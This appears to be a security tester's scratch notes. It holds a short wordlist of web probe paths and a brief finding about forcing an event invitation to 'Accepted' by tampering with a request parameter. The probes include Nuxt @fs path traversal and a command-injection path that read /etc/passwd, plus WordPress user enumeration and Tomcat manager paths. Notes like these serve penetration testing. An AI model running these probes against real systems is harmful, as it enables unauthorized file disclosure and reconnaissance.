/_nuxt/@fs
/_nuxt/@fs/etc/passwd
/pages/systemcall.php\?command\=cat%20/etc/passwd
/issues/?filter=
/jira/issues/?filter=
/wp-json/wp/v2/users/
/_rpc?rpc=getConsentScreenDetails
/_rpc?rpc=
/manager/html

The application allows an invited user's event participation status to be modified to "Accepted" by tampering with a request parameter, without requiring the invited user to explicitly accept the invitation via the intended email workflow. As a result, an attacker can bypass the invitation acceptance process and add users to events without their consent
